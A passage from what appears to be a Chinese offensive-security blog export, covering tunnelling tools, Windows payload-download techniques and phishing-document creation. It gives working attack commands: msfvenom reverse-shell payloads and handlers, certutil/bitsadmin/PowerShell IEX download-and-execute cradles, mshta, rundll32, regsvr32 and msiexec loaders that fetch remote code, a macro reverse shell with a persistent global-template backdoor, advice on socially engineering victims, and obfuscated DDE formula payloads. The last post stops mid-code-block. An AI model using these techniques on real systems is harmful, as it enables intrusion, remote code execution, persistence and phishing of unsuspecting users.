src="image-20210130210249919.png" alt="image-20210130210249919"></p><p>攻击机将端口1转发至端口2：<code>./rtcp.py l:port1 l:port2</code></p><p><img src="image-20210130210326260.png" alt="image-20210130210326260"></p><p>如果客户机是linux，可以转发时将22端口转发出来，然后ssh连接本地端口2：<code>ssh -p lhost port2</code></p><p>但是此次客户机是Windows，则转发3389，连接本地的端口2</p><p><img src="image-20210130210444890.png" alt="image-20210130210444890"></p><h2 id="11-ngrock"><a href="#11-ngrock" class="headerlink" title="11.ngrock"></a>11.ngrock</h2><p>官网：<a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p><p>一款在线的内网穿透工具，本例以msf+ngrok</p><p>首先隧道管理-开通隧道-滑倒最后选择免费的服务器，然后简单设置一下</p><p><img src="image-20210130024649750.png" alt="image-20210130024649750"></p><p>注意：本地端口那里ip和端口选择kali的ip和端口</p><p>点击确定后成功开通</p><p><img src="image-20210130024913633.png" alt="image-20210130024913633"></p><p>将客户端下载到kali，启动：<code>./sunny clientid 隧道id</code></p><p><img src="image-20210130025255206.png" alt="image-20210130025255206"></p><p><img src="image-20210130025331893.png" alt="image-20210130025331893"></p><p>然后msf制作木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=远程端口 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>然后开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp  </span><br><span class="line"></span><br><span class="line">set lhost 192.168.43.30  //这个就是你刚刚网站的填写的IP</span><br><span class="line"></span><br><span class="line">set lport 3333  //这个就是刚刚IP后面跟着的端口</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lcx </tag>
            
            <tag> netsh </tag>
            
            <tag> htran </tag>
            
            <tag> socat </tag>
            
            <tag> fpipe </tag>
            
            <tag> portfwd </tag>
            
            <tag> cs </tag>
            
            <tag> rinetd </tag>
            
            <tag> rtcp </tag>
            
            <tag> ngrock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>payload下载</title>
      <link href="/2020/10/05/ayload%E4%B8%8B%E8%BD%BD/"/>
      <url>/2020/10/05/ayload%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>执行机器：win7  192.168.43.78</p><p>服务器：win2k8+phpstudy  192.168.43.127</p><h2 id="1-vbs"><a href="#1-vbs" class="headerlink" title="1.vbs"></a>1.vbs</h2><p>使用echo将以下内容写入downfile.vbs,写入成功后会在相应的文件夹生成一个downfile.vbs文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs </span><br></pre></td></tr></table></figure><p>可使用type查看文件内容<code>type downfile.vbs</code></p><p>使用cscript 结合vbs文件下载payload[exe]：<code>cscript downfile.vbs payload路径 payload落地地址</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;cscript downfile.vbs http://192.168.43.127/payload.txt C:\Users\haha\Desktop\test\1.txt</span><br></pre></td></tr></table></figure><p>优点:支持windows全版本系列   缺点:对https不友好</p><h2 id="2-certutil"><a href="#2-certutil" class="headerlink" title="2.certutil"></a>2.certutil</h2><p>使用<code>certutil -urlcache -split -f payload地址</code> 来下载文件 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/payload.txt</span><br><span class="line">****  联机  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  000f</span><br><span class="line">CertUtil: -URLCache 命令成功完成。</span><br></pre></td></tr></table></figure><p>在使用后会出现缓存，使用<code>certutil -urlcache -split -f payload地址 delete </code>来删除即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/pa</span><br><span class="line">yload.txt delete</span><br><span class="line">http://192.168.43.127/payload.txt</span><br><span class="line"></span><br><span class="line">删除的 WinHttp 缓存项目: 1</span><br><span class="line"></span><br><span class="line">CertUtil: -URLCache 命令成功完成。</span><br></pre></td></tr></table></figure><h2 id="3-bitsadmin"><a href="#3-bitsadmin" class="headerlink" title="3.bitsadmin"></a>3.bitsadmin</h2><p>使用<code>bitsadmin /rawreturn /transfer down payload地址 保存payload路径/文件名</code>下载payload[exe]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;bitsadmin /rawreturn /transfer down http://192.168.43</span><br><span class="line">.127/payload.txt C:\Users\haha\Desktop\test\xx.txt</span><br></pre></td></tr></table></figure><h2 id="4-js"><a href="#4-js" class="headerlink" title="4.js"></a>4.js</h2><p>新建一个js文件将以下内容保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">BinStream.Type = 1;</span><br><span class="line">BinStream.Open();</span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;payload目标机器保存文件名&quot;);</span><br></pre></td></tr></table></figure><p>使用<code>cscript /nologo 上述js文件名 payload地址</code> 下载payload[exe]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;cscript /nologo 1.js http://192.168.43.127/payload.tx</span><br><span class="line">t</span><br></pre></td></tr></table></figure><p>下载完成后所下载的文件会保存在js文件同一目录下</p><h2 id="5-wget"><a href="#5-wget" class="headerlink" title="5.wget"></a>5.wget</h2><p>需要将wget.exe上传到目标机器，在相应目录下执行<code>wget -O &quot;payload落地文件名&quot; payload地址</code>即可下载payload[exe]</p><p>wget地址：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p><h2 id="6-curl"><a href="#6-curl" class="headerlink" title="6.curl"></a>6.curl</h2><p>直接在相应目录的cmd下执行<code>curl payload地址 -o 落地文件名</code>下载payload[exe]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\新建文件夹&gt;curl http://192.168.43.127/11.exe -o 1x.exe</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  366k  100  366k    0     0   366k      0  0:00:01 --:--:--  0:00:01 11.5M</span><br></pre></td></tr></table></figure><h2 id="7-powershell"><a href="#7-powershell" class="headerlink" title="7.powershell"></a>7.powershell</h2><h3 id="1-下载payload-exe-到本地"><a href="#1-下载payload-exe-到本地" class="headerlink" title="1.下载payload[exe]到本地"></a>1.下载payload[exe]到本地</h3><p><code>powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code>或者是</p><p><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha\Desktop\test&gt;powershell -exec bypass -c (new-object System.Net.Web</span><br><span class="line">Client).DownloadFile(&#x27;http://192.168.43.127/payload.txt&#x27;,&#x27;C:\Users\haha\Desktop\</span><br><span class="line">test\2.txt&#x27;)</span><br><span class="line">或者</span><br><span class="line">C:\Users\haha\Desktop\test&gt;powershell (new-object System.Net.WebClient).Download</span><br><span class="line">File(&#x27;http://192.168.43.127/payload.txt&#x27;,&#x27;evil.txt&#x27;)</span><br></pre></td></tr></table></figure><h3 id="2-远程执行命令，无文件落地"><a href="#2-远程执行命令，无文件落地" class="headerlink" title="2.远程执行命令，无文件落地"></a>2.远程执行命令，无文件落地</h3><p><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;payload地址&#39;))&quot;</code></p><h2 id="8-ipc-文件共享"><a href="#8-ipc-文件共享" class="headerlink" title="8.ipc$文件共享"></a>8.ipc$文件共享</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。（此时关闭了PHP study）</p><p>建立远程IPC连接:<code>net use \\目标ip\ipc$ /user:administrator &quot;密码&quot; </code> (注意是管理员)<br>复制远程文件到本地主机:<code>copy \\目标ip\c$\payload payload落地地址 </code></p><p>查看目标机器是否开启IPC服务<code>net share</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_">C$ </span><span class="language-bash">          C:\                             默认共享</span></span><br><span class="line"><span class="meta prompt_">IPC$ </span><span class="language-bash">                                        远程 IPC</span></span><br><span class="line"><span class="meta prompt_">ADMIN$ </span><span class="language-bash">      C:\Windows                      远程管理</span></span><br><span class="line">命令成功完成。</span><br><span class="line">C:\Users\haha&gt;</span><br></pre></td></tr></table></figure><h2 id="9-ftp"><a href="#9-ftp" class="headerlink" title="9.ftp"></a>9.ftp</h2><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><p><code>ftp 127.0.0.1</code></p><p><code>username</code></p><p><code>password</code></p><p><code>get payload</code></p><p><code>exit</code></p><h2 id="10-TFTP"><a href="#10-TFTP" class="headerlink" title="10.TFTP"></a>10.TFTP</h2><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p><p><code>tftp -i vps-IP get payload 存放位置</code></p><h2 id="11-WinScp"><a href="#11-WinScp" class="headerlink" title="11.WinScp"></a>11.WinScp</h2><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p><p>上传文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt /tmp/&quot; &quot;exit&quot; /log=log_file.txt </code></p><p>下载文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.txt</code></p><h2 id="12-msiexec"><a href="#12-msiexec" class="headerlink" title="12.msiexec"></a>12.msiexec</h2><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#生成msi包</span><br><span class="line">msfvenom -p windows/exec CMD=&#x27;net user test abc123! /add&#x27; -f msi &gt; evil.msi</span><br><span class="line">#远程执行添加一个test用户</span><br><span class="line">msiexec /q /i http://192.168.43.127/evil.msi</span><br></pre></td></tr></table></figure><h2 id="13-IEExec"><a href="#13-IEExec" class="headerlink" title="13.IEExec"></a>13.IEExec</h2><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><p>生成Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=3333 -f exe -o evil.exe</span><br></pre></td></tr></table></figure><p>使用管理员身份打开cmd，分别运行下面两条命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.43.127/evil.exe</span><br></pre></td></tr></table></figure><h2 id="14-mshta"><a href="#14-mshta" class="headerlink" title="14.mshta"></a>14.mshta</h2><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><p><code>mshta http://192.168.43.127/payload.hta</code></p><p>payload.hta内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令</span><br><span class="line">self.close</span><br><span class="line">demo</span><br></pre></td></tr></table></figure><h2 id="15-rundll32"><a href="#15-rundll32" class="headerlink" title="15.rundll32"></a>15.rundll32</h2><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p><p>步骤一，开始运行JSRat，监听本地8888端口：<code>./JSRat.py -i 192.168.43.30 -p 3333</code></p><p>步骤二：通过url访问，可以查看恶意代码。复制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.43.30:3333/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure><p>步骤三：在受害者PC运行该代码，将成功返回一个会话</p><h2 id="16-regsvr32"><a href="#16-regsvr32" class="headerlink" title="16.regsvr32"></a>16.regsvr32</h2><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><p>在目标机上执行：<code>regsvr32.exe /u /n /s /i:http://192.168.43.127/file.sct scrobj.dll</code></p><p>可以通过自己构造file.sct文件，去下载执行我们的程序，例如执行以下命令，成功弹计算器。（本次机器未复现成功）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt; </span><br><span class="line">progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; </span><br><span class="line">    ps  = &quot;cmd.exe /c calc.exe&quot;;</span><br><span class="line">        new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line">      ]]&gt;</span><br></pre></td></tr></table></figure><h2 id="17-MSXSL-EXE"><a href="#17-MSXSL-EXE" class="headerlink" title="17.MSXSL.EXE"></a>17.MSXSL.EXE</h2><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下可弹出计算器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl http://192.168.28.128/scripts/demo.xml http://192.168.43.127/scripts/exec.xsl</span><br></pre></td></tr></table></figure><p>demo.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span><br><span class="line">&lt;customers&gt;</span><br><span class="line">&lt;customer&gt;</span><br><span class="line">&lt;name&gt;Microsoftname&gt;</span><br><span class="line">customer&gt;</span><br><span class="line">customers&gt;</span><br></pre></td></tr></table></figure><p>exec.xsl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;</span><br><span class="line">&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;</span><br><span class="line">function xml(nodelist) </span><br><span class="line">&#123;</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">return nodelist.nextNode().xml;   </span><br><span class="line">&#125;msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt;   </span><br><span class="line">&lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;</span><br><span class="line">xsl:template&gt;xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure><h2 id="18-pubprn-vbs"><a href="#18-pubprn-vbs" class="headerlink" title="18.pubprn.vbs"></a>18.pubprn.vbs</h2><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于<code>C:\Windows\System32\Printing_Admin_Scripts\en-US</code>，仔细观察该脚本可以发现其显然是由用户提供输入(通过命令行参数)，之后再将参数传递给GetObject()</p><p>在目标机器上执行以下命令会弹出计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Windows\System32\Printing_Admin_Scripts\zh-CN\  #en-US</span><br><span class="line">C:\Windows\System32\Printing_Admin_Scripts\zh-CN&gt;pubprn.vbs&quot; 127.0.0.1 script:http//192.168.43.30/test.sct</span><br></pre></td></tr></table></figure><p>test.sct</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable=&quot;true&quot;</span><br><span class="line">    &gt;</span><br><span class="line">registration&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">script&gt;</span><br><span class="line">scriptlet&gt;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/weixin_36303045/article/details/112490857">https://blog.csdn.net/weixin_36303045/article/details/112490857</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vbs </tag>
            
            <tag> certutil </tag>
            
            <tag> bitsadmin </tag>
            
            <tag> js </tag>
            
            <tag> wget </tag>
            
            <tag> curl </tag>
            
            <tag> powershell </tag>
            
            <tag> ipc$文件共享 </tag>
            
            <tag> ftp </tag>
            
            <tag> tftp </tag>
            
            <tag> winscp </tag>
            
            <tag> msiexec </tag>
            
            <tag> IEExec </tag>
            
            <tag> mshta </tag>
            
            <tag> rundll32 </tag>
            
            <tag> regsvr32 </tag>
            
            <tag> MSXSL.EXE </tag>
            
            <tag> pubprn.vbs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀文档制作</title>
      <link href="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/"/>
      <url>/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍一些钓鱼文档的制作方法。</p><span id="more"></span><h2 id="1-office宏攻击"><a href="#1-office宏攻击" class="headerlink" title="1.office宏攻击"></a>1.office宏攻击</h2><p>宏是微软公司为其OFFICE软件包设计的一个特殊功能，有着独特的文件后缀名，如：xlsm，docm，pptm等。</p><p>office：2016教育版</p><p>攻击机：kali 192.168.43.30</p><h3 id="1-msf生成payload"><a href="#1-msf生成payload" class="headerlink" title="1.msf生成payload"></a>1.msf生成payload</h3><p>1.先msf生成一段payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f vba -o shell.vba</span><br></pre></td></tr></table></figure><p>2.新建一个启用宏的office文档。</p><p><img src="1.png" alt="image-20210128001528982"></p><p>3.然后点击并勾选：文件-选项-自定义功能区-开发工具。</p><p>4.点击宏</p><p><img src="image-20210128001945054.png" alt="image-20210128001945054"></p><p>5.创建一个新的文件宏，注意宏名只能为字母或汉字，不能为数字；选择宏的位置为第一步新建的启用宏的office文档的名字</p><p><img src="image-20210128000409133.png" alt="image-20210128000409133"></p><p>6.将文本框里的代码全部替换为msf生成宏代码，Ctrl+s，关闭文本框，Ctrl+s，退出。</p><p>7.在靶机里打开office文档，启用宏，msf上线。</p><p><img src="image-20210128000509782.png" alt="image-20210128000509782"></p><h3 id="2-cs生成payload"><a href="#2-cs生成payload" class="headerlink" title="2.cs生成payload"></a>2.cs生成payload</h3><p>步骤和msf生成payload制作木马一样，只不过需要将msf的木马替换为cs的MS Office Macro的马。</p><p><img src="image-20210128001050461.png" alt="image-20210128001050461"></p><h3 id="3-建立全局宏持久性后门"><a href="#3-建立全局宏持久性后门" class="headerlink" title="3.建立全局宏持久性后门"></a>3.建立全局宏持久性后门</h3><p>office宏除了用于钓鱼，还可以用来建立隐蔽的持久性后门。新建一个宏，位置要选择所有活动模版和文档。</p><p><img src="image-20210128003712029.png" alt="image-20210128003712029"></p><p>在ThisDocument中写入宏代码，进行保存。</p><p><img src="image-20210128003907554.png" alt="image-20210128003907554"></p><p>成功建立了一个隐藏持久性后门，打开任意文档都可以触发宏代码。</p><h3 id="4-文件图标替换"><a href="#4-文件图标替换" class="headerlink" title="4.文件图标替换"></a>4.文件图标替换</h3><p>生成宏的文档和正常的文档图标不一样</p><p><img src="image-20210128005843267.png" alt="image-20210128005843267"></p><p>还没找到可以替换文档图片的方法，，，不过知道替换exe图片的一个软件：Restorator</p><h3 id="5-缺点"><a href="#5-缺点" class="headerlink" title="5.缺点"></a>5.缺点</h3><p>类似office宏还有一些其它利用方式，如DOCX文档远程模板注入执行宏，还可以通过shellcode进行免杀处理。在实战中，首先尽可能社工目标的各种信息，取得对方信任，根据钓鱼的目标，修改文档的名字，通过邮箱进行发送，如xx公司采购说明。</p><p>office宏钓鱼存在几大不适用性：</p><p>1、对方电脑未使用office。</p><p>2、office默认禁用宏，打开文件会进行提示。</p><p>3、独特的宏文件后缀，docm，xlsm等，容易引起他人怀疑。</p><p>4、免杀性要求较高。</p><h2 id="2-DDE"><a href="#2-DDE" class="headerlink" title="2.DDE"></a>2.DDE</h2><p>动态数据交换（DDE），它是在Microsoft Windows操作系统中实现的客户端&#x2F;服务器通信方法。</p><p>在开源的openoffice中可以直接调用DDE函数，像&#x3D;DDE(“cmd”;”&#x2F;C calc”;”123”)这样调用。</p><p>而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDE。注意：该方法的提示窗口只提示application而不提示topic。</p><p>一些特性：</p><p>1、当excel遇到+和-会自动填充&#x3D;成为公式，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+thespnquisition(cmd|&#x27;/c calc.exe&#x27;!A</span><br></pre></td></tr></table></figure><p>2、若打开的外部应用为8字符，excel自动忽略后面的字符，如下面的两个作用相同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=rundll32|&#x27;URL.dll,OpenURL calc.exe&#x27;!A</span><br><span class="line">=rundll321234567890abcdefghijklmnopqrstuvwxyz|&#x27;URL.dll,OpenURL calc.exe&#x27;!A</span><br></pre></td></tr></table></figure><p>3、将其他表达式或空格填充在恶意表达式之前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=AA+BB-CC&amp;&quot;Hello&quot;/12345&amp;cmd|&#x27;/c calc.exe&#x27;!A</span><br></pre></td></tr></table></figure><p>4、通过windows batch的语法特性，填充无意义或是不影响执行逻辑的字符和指令，将topic字段混淆，如以下payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&#x27;/c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?&quot;&#x27;!_xlbgnm.A1</span><br><span class="line"></span><br><span class="line">#/c 是cmd参数，表示执行后关闭窗口</span><br><span class="line">#REM 示后面的内容是注释</span><br><span class="line">#. 表示空行，用于终止之前的REM</span><br><span class="line">#&amp;&amp; 表示如果前一条指令执行成功则执行后一条指令</span><br><span class="line">#@ 表示执行窗口不显示后面的命令</span><br><span class="line">#^ 表示转义，此处无实际意义，只是用来混淆powershell这一敏感词</span><br><span class="line">#? 表示powershell通配符，其中匹配任意字符串，?匹配1个字符，此处能唯一定位到c:/windows/system32/calc.exe</span><br><span class="line">#“ 无实际用途，删了也没啥区别</span><br></pre></td></tr></table></figure><p>所以经过解析后，实际执行的命令是:</p><figure class="highlight plaintext"><table><tr><td 